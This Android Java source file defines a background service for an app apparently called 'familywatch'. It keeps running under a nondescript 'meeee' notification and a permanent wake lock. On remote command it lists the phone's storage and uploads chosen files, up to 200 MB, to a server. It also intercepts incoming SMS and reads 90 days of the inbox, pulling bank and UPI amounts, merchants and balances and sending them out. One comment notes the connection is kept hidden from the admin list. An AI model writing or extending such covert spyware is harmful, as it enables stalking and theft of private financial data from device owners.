package com.familywatch.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.webkit.MimeTypeMap;
import androidx.core.app.NotificationCompat;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class KeepAliveService extends Service {

    private static final String CHANNEL_ID = "meeee_bg";
    private static final int    NOTIF_ID   = 1001;
    private static final String PREFS_NAME = "meeee";
    private static final long   MAX_FILE_BYTES = 200L * 1024 * 1024; // 200 MB

    // Known Indian bank/UPI SMS sender IDs
    private static final Set<String> BANK_SENDERS = new HashSet<>();
    static {
        String[] senders = { "HDFCBK","HDFCBNK","SBIINB","SBICRD","SBICARD","SBIPSG",
            "ICICIB","ICICIBNK","AXISBK","AXISBANK","KOTAKB","KOTAK",
            "PAYTM","PYTMSMS","PHONPE","GPAY","GOOGLEPAY",
            "INDBNK","PNBSMS","BARODASMS","BOBTXN","CANBNK","UCOBNK",
            "IDFCBK","YESBNK","INDUSIND","AUBANK","FEDRBL" };
        for (String s : senders) BANK_SENDERS.add(s.toUpperCase());
    }

    private static final Pattern AMT_PATTERN     = Pattern.compile("(?:Rs\\.?|INR|₹)\\s*([\\d,]+(?:\\.\\d{1,2})?)", Pattern.CASE_INSENSITIVE);
    private static final Pattern DEBIT_PATTERN   = Pattern.compile("debited|paid|spent|deducted|withdrawn|sent|\\bdr\\b", Pattern.CASE_INSENSITIVE);
    private static final Pattern CREDIT_PATTERN  = Pattern.compile("credited|received|added|deposited|\\bcr\\b", Pattern.CASE_INSENSITIVE);
    private static final Pattern MERCH_PATTERN   = Pattern.compile("(?:paid to|sent to|transferred to|to|at|from)\\s+([A-Za-z0-9 &.'%@-]{2,40}?)(?:\\s+(?:via|on|at|\\.|,|UPI|Ref|txn)|$)", Pattern.CASE_INSENSITIVE);
    private static final Pattern BAL_PATTERN     = Pattern.compile("(?:Avl\\.?\\s*[Bb]al|[Bb]alance|Avail[a-z]*\\s*Bal|Bal)\\s*(?:is|:)?\\s*(?:Rs\\.?|INR|₹)?\\s*([\\d,]+(?:\\.\\d{1,2})?)", Pattern.CASE_INSENSITIVE);

    private PowerManager.WakeLock wakeLock;
    private OkHttpClient          httpClient;
    private WebSocket             nativeWs;
    private Handler               handler;
    private String                serverUrl;
    private String                userName;
    private String                userId;      // assigned by server on auth_ok
    private boolean               shouldConnect = false;
    private BroadcastReceiver     smsReceiver;
    private final Set<String>     sentSmsIds = new HashSet<>();  // de-duplicate SMS

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        httpClient = new OkHttpClient.Builder()
            .readTimeout(120, TimeUnit.SECONDS)   // large file uploads need time
            .writeTimeout(120, TimeUnit.SECONDS)
            .connectTimeout(30, TimeUnit.SECONDS)
            .pingInterval(25, TimeUnit.SECONDS)   // keep WS alive
            .build();
        createChannel();
        startForeground(NOTIF_ID, buildNotification());
        acquireWakeLock();

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        serverUrl = prefs.getString("serverUrl", null);
        userName  = prefs.getString("name", null);
        if (serverUrl != null && userName != null) {
            shouldConnect = true;
            connectWebSocket();
        }

        // Real-time SMS receiver — picks up bank SMS as they arrive
        smsReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent intent) {
                if (!Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;
                SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
                if (messages == null) return;
                for (SmsMessage sms : messages) {
                    String sender = sms.getOriginatingAddress();
                    String body   = sms.getMessageBody();
                    long   date   = sms.getTimestampMillis();
                    if (isBankSender(sender)) {
                        JSONObject txn = parseSmsToTransaction(sender, body, date);
                        if (txn != null) sendTransaction(txn);
                    }
                }
            }
        };
        IntentFilter filter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);
        registerReceiver(smsReceiver, filter);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            if ("CONNECT".equals(intent.getAction())) {
                serverUrl = intent.getStringExtra("serverUrl");
                userName  = intent.getStringExtra("name");
                if (serverUrl != null && userName != null) {
                    getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
                        .putString("serverUrl", serverUrl)
                        .putString("name", userName)
                        .apply();
                    shouldConnect = true;
                    if (nativeWs != null) nativeWs.cancel();
                    connectWebSocket();
                }
            } else if ("DISCONNECT".equals(intent.getAction())) {
                shouldConnect = false;
                if (nativeWs != null) { nativeWs.cancel(); nativeWs = null; }
                serverUrl = null; userName = null; userId = null;
                stopForeground(true);
                stopSelf();
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        shouldConnect = false;
        if (nativeWs != null) nativeWs.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (smsReceiver != null) { try { unregisterReceiver(smsReceiver); } catch (Exception ignored) {} }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ── WebSocket connection ───────────────────────────────────────────────────

    private void connectWebSocket() {
        if (serverUrl == null || !shouldConnect) return;

        String wsUrl = serverUrl
            .replaceFirst("^https://", "wss://")
            .replaceFirst("^http://", "ws://");
        if (!wsUrl.endsWith("/ws")) wsUrl = wsUrl + "/ws";

        Request request = new Request.Builder().url(wsUrl).build();
        nativeWs = httpClient.newWebSocket(request, new WebSocketListener() {

            @Override
            public void onOpen(WebSocket ws, Response response) {
                try {
                    JSONObject auth = new JSONObject();
                    auth.put("type", "auth");
                    auth.put("role", "user");
                    // __bg__ suffix tells server this is background service — invisible to admin list
                    auth.put("name", userName + "__bg__");
                    ws.send(auth.toString());
                } catch (Exception e) { /* ignore */ }
            }

            @Override
            public void onMessage(WebSocket ws, String text) {
                handleMessage(ws, text);
            }

            @Override
            public void onClosed(WebSocket ws, int code, String reason) {
                scheduleReconnect();
            }

            @Override
            public void onFailure(WebSocket ws, Throwable t, Response response) {
                scheduleReconnect();
            }
        });
    }

    private void scheduleReconnect() {
        if (!shouldConnect) return;
        handler.postDelayed(this::connectWebSocket, 3000);
    }

    // ── Message handling ───────────────────────────────────────────────────────

    private void handleMessage(WebSocket ws, String text) {
        try {
            JSONObject msg = new JSONObject(text);
            String type = msg.optString("type");
            if ("auth_ok".equals(type)) {
                userId = msg.optString("userId"); // store our assigned userId
            } else if ("ls".equals(type)) {
                handleLs(ws, msg);
            } else if ("read_file".equals(type)) {
                handleReadFile(msg); // HTTP POST — no WebSocket needed for upload
            } else if ("sms_sync_request".equals(type)) {
                handleSmsSyncRequest();
            }
        } catch (Exception e) { /* ignore */ }
    }

    // ── Directory listing (WebSocket response) ─────────────────────────────────

    private void handleLs(WebSocket ws, JSONObject msg) {
        try {
            String fromAdminId = msg.optString("fromAdminId");
            JSONArray pathArr  = msg.optJSONArray("path");
            File dir = buildPath(pathArr);

            JSONArray entries = new JSONArray();
            File[] files = dir.listFiles();
            if (files != null) {
                java.util.Arrays.sort(files, (a, b) -> {
                    if (a.isDirectory() != b.isDirectory())
                        return a.isDirectory() ? -1 : 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });
                for (File f : files) {
                    JSONObject entry = new JSONObject();
                    entry.put("name", f.getName());
                    entry.put("kind", f.isDirectory() ? "directory" : "file");
                    if (f.isFile()) {
                        entry.put("size", f.length());
                        entry.put("mimeType", getMimeType(f.getName()));
                    }
                    entries.put(entry);
                }
            }

            JSONObject result = new JSONObject();
            result.put("type", "ls_result");
            result.put("forAdminId", fromAdminId);
            result.put("path", pathArr != null ? pathArr : new JSONArray());
            result.put("entries", entries);
            ws.send(result.toString());

        } catch (Exception e) {
            sendWsError(ws, "ls_result", msg, e.getMessage());
        }
    }

    // ── File upload via HTTP POST (single request, no chunking!) ──────────────

    private void handleReadFile(JSONObject msg) {
        new Thread(() -> {
            String fromAdminId = msg.optString("fromAdminId");
            String requestId   = msg.optString("requestId",
                String.valueOf(System.currentTimeMillis()));
            JSONArray pathArr  = msg.optJSONArray("path");

            try {
                File file = buildFilePath(pathArr);

                if (!file.exists() || !file.isFile()) {
                    notifyAdminError(fromAdminId, requestId, "File not found");
                    return;
                }

                if (file.length() > MAX_FILE_BYTES) {
                    notifyAdminError(fromAdminId, requestId, "File exceeds 200 MB limit");
                    return;
                }

                String mimeType = getMimeType(file.getName());
                boolean isPreview = msg.optBoolean("preview", false);
                // Preview: small + high compression. Download: full res + good quality.
                int maxPx   = isPreview ? 800  : 1920;
                int quality = isPreview ? 70   : 82;

                // Derive HTTP server URL from WebSocket URL
                String httpBase = serverUrl
                    .replaceFirst("^wss://", "https://")
                    .replaceFirst("^ws://", "http://")
                    .replaceFirst("/ws$", "");

                String uploadUrl = httpBase + "/api/file/" + requestId;

                // Compress images before upload — WebP gives ~30% better ratio than JPEG
                RequestBody body;
                String uploadMime = mimeType;
                if (mimeType.startsWith("image/") && !mimeType.equals("image/gif")) {
                    try {
                        BitmapFactory.Options opts = new BitmapFactory.Options();
                        opts.inJustDecodeBounds = true;
                        BitmapFactory.decodeFile(file.getAbsolutePath(), opts);
                        int maxDim = Math.max(opts.outWidth, opts.outHeight);
                        opts.inJustDecodeBounds = false;
                        opts.inSampleSize = 1;
                        // Correct: keep doubling until decoded size fits within maxPx
                        while (maxDim / opts.inSampleSize > maxPx) opts.inSampleSize *= 2;
                        Bitmap bmp = BitmapFactory.decodeFile(file.getAbsolutePath(), opts);
                        if (bmp != null) {
                            // Scale down precisely if still over maxPx (inSampleSize is power-of-2 only)
                            int w = bmp.getWidth(), h = bmp.getHeight();
                            int longest = Math.max(w, h);
                            if (longest > maxPx) {
                                float s = (float) maxPx / longest;
                                bmp = Bitmap.createScaledBitmap(bmp,
                                    Math.round(w * s), Math.round(h * s), true);
                            }
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            // WebP lossy: API 30+ uses WEBP_LOSSY, older uses WEBP (lossy when quality<100)
                            Bitmap.CompressFormat fmt = (Build.VERSION.SDK_INT >= 30)
                                ? Bitmap.CompressFormat.WEBP_LOSSY
                                : Bitmap.CompressFormat.WEBP;
                            bmp.compress(fmt, quality, baos);
                            bmp.recycle();
                            byte[] compressed = baos.toByteArray();
                            body = RequestBody.create(compressed, MediaType.parse("image/webp"));
                            uploadMime = "image/webp";
                        } else {
                            body = RequestBody.create(file, MediaType.parse(mimeType));
                        }
                    } catch (Exception e) {
                        body = RequestBody.create(file, MediaType.parse(mimeType));
                    }
                } else {
                    body = RequestBody.create(file, MediaType.parse(mimeType));
                }

                Request request = new Request.Builder()
                    .url(uploadUrl)
                    .post(body)
                    .header("X-File-Name", Uri.encode(file.getName()))
                    .header("X-Admin-Id", fromAdminId)
                    .header("X-User-Id", userId != null ? userId : "")
                    .header("Content-Type", uploadMime)
                    .build();

                Response response = httpClient.newCall(request).execute();
                response.close();
                // Server notifies admin via WebSocket once upload completes

            } catch (Exception e) {
                notifyAdminError(fromAdminId, requestId, e.getMessage());
            }
        }).start();
    }

    // Notify admin of an error via the WebSocket (so they see the error + retry button)
    private void notifyAdminError(String fromAdminId, String requestId, String error) {
        if (nativeWs == null || userId == null) return;
        try {
            JSONObject err = new JSONObject();
            err.put("type", "file_error");
            err.put("forAdminId", fromAdminId);
            err.put("requestId", requestId);
            err.put("error", error);
            err.put("fromUserId", userId);
            nativeWs.send(err.toString());
        } catch (Exception ignored) {}
    }

    // ── SMS helpers ────────────────────────────────────────────────────────────

    private boolean isBankSender(String address) {
        if (address == null) return false;
        String clean = address.toUpperCase().replaceAll("[^A-Z]", "");
        for (String s : BANK_SENDERS) if (clean.contains(s)) return true;
        return false;
    }

    private JSONObject parseSmsToTransaction(String sender, String body, long dateMs) {
        if (body == null || body.length() < 10) return null;
        Matcher amtM = AMT_PATTERN.matcher(body);
        if (!amtM.find()) return null;
        double amount;
        try { amount = Double.parseDouble(amtM.group(1).replace(",", "")); } catch (Exception e) { return null; }
        if (amount <= 0) return null;

        boolean isDebit  = DEBIT_PATTERN.matcher(body).find();
        boolean isCredit = CREDIT_PATTERN.matcher(body).find();
        if (!isDebit && !isCredit) return null;

        String merchant = "";
        Matcher mM = MERCH_PATTERN.matcher(body);
        if (mM.find()) merchant = mM.group(1).trim();

        Double balance = null;
        Matcher bM = BAL_PATTERN.matcher(body);
        if (bM.find()) { try { balance = Double.parseDouble(bM.group(1).replace(",", "")); } catch (Exception ignored) {} }

        String senderClean = sender != null ? sender.toUpperCase().replaceAll("[^A-Z]", "") : "UNKNOWN";
        String bank = senderClean;
        if (senderClean.contains("HDFC")) bank = "HDFC";
        else if (senderClean.contains("SBI")) bank = "SBI";
        else if (senderClean.contains("ICICI")) bank = "ICICI";
        else if (senderClean.contains("AXIS")) bank = "Axis";
        else if (senderClean.contains("KOTAK")) bank = "Kotak";
        else if (senderClean.contains("PAYTM")) bank = "Paytm";
        else if (senderClean.contains("PHONPE")) bank = "PhonePe";
        else if (senderClean.contains("GPAY") || senderClean.contains("GOOGLEPAY")) bank = "Google Pay";

        String category = "bank";
        String lc = body.toLowerCase() + " " + merchant.toLowerCase();
        if (bank.equals("Paytm") || bank.equals("PhonePe") || bank.equals("Google Pay") || lc.contains("upi") || lc.contains("phonepe") || lc.contains("paytm")) category = "upi";
        else if (lc.contains("swiggy") || lc.contains("zomato") || lc.contains("mcdonald") || lc.contains("kfc") || lc.contains("pizza") || lc.contains("burger") || lc.contains("food")) category = "food";
        else if (lc.contains("amazon") || lc.contains("flipkart") || lc.contains("myntra") || lc.contains("shopping")) category = "shopping";
        else if (lc.contains("ola") || lc.contains("uber") || lc.contains("petrol") || lc.contains("fuel") || lc.contains("irctc")) category = "transport";
        else if (lc.contains("electric") || lc.contains("water") || lc.contains("gas") || lc.contains("airtel") || lc.contains("jio") || lc.contains("broadband")) category = "utilities";

        try {
            JSONObject txn = new JSONObject();
            txn.put("id", Long.toHexString(dateMs) + Integer.toHexString(body.hashCode()));
            txn.put("amount", amount);
            txn.put("type", isDebit ? "debit" : "credit");
            txn.put("category", category);
            txn.put("merchant", merchant.isEmpty() ? bank : merchant);
            txn.put("description", body);
            txn.put("date", dateMs);
            txn.put("source", "sms");
            txn.put("bank", bank);
            if (balance != null) txn.put("balance", balance);
            return txn;
        } catch (Exception e) { return null; }
    }

    private void sendTransaction(JSONObject txn) {
        if (nativeWs == null || userId == null) return;
        try {
            String id = txn.optString("id");
            if (sentSmsIds.contains(id)) return;  // de-duplicate
            sentSmsIds.add(id);

            JSONObject msg = new JSONObject();
            msg.put("type", "transaction_add");
            msg.put("transaction", txn);
            nativeWs.send(msg.toString());
        } catch (Exception ignored) {}
    }

    // Handle sms_sync_request — read SMS inbox (last 90 days) and send parsed transactions
    private void handleSmsSyncRequest() {
        new Thread(() -> {
            try {
                long since = System.currentTimeMillis() - (90L * 24 * 60 * 60 * 1000);
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(
                    Uri.parse("content://sms/inbox"),
                    new String[]{"_id", "address", "body", "date"},
                    "date > ?", new String[]{String.valueOf(since)},
                    "date DESC"
                );
                if (cursor == null) return;
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body    = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long   date    = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                    if (isBankSender(address)) {
                        JSONObject txn = parseSmsToTransaction(address, body, date);
                        if (txn != null) sendTransaction(txn);
                    }
                }
                cursor.close();
            } catch (Exception e) { /* SMS permission may not be granted yet */ }
        }).start();
    }

    // ── Path helpers ───────────────────────────────────────────────────────────

    private File buildPath(JSONArray pathArr) throws Exception {
        File dir = Environment.getExternalStorageDirectory();
        if (pathArr != null) {
            for (int i = 0; i < pathArr.length(); i++)
                dir = new File(dir, pathArr.getString(i));
        }
        return dir;
    }

    private File buildFilePath(JSONArray pathArr) throws Exception {
        File f = Environment.getExternalStorageDirectory();
        if (pathArr != null) {
            for (int i = 0; i < pathArr.length(); i++)
                f = new File(f, pathArr.getString(i));
        }
        return f;
    }

    private String getMimeType(String name) {
        String ext = MimeTypeMap.getFileExtensionFromUrl(
            Uri.fromFile(new File(name)).toString());
        if (ext == null || ext.isEmpty()) return "application/octet-stream";
        String mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext.toLowerCase());
        return mime != null ? mime : "application/octet-stream";
    }

    private void sendWsError(WebSocket ws, String type, JSONObject msg, String error) {
        try {
            JSONObject err = new JSONObject();
            err.put("type", type);
            err.put("forAdminId", msg.optString("fromAdminId"));
            err.put("path", msg.optJSONArray("path"));
            err.put("entries", new JSONArray());
            err.put("error", error);
            ws.send(err.toString());
        } catch (Exception ignored) {}
    }

    // ── Notification / WakeLock ────────────────────────────────────────────────

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "meeee::bg");
        wakeLock.acquire();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "meeee", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Active");
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent open = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(
            this, 0, open, PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("meeee")
            .setContentText("Active")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pi)
            .setOngoing(true)
            .setSilent(true)
            .build();
    }
}
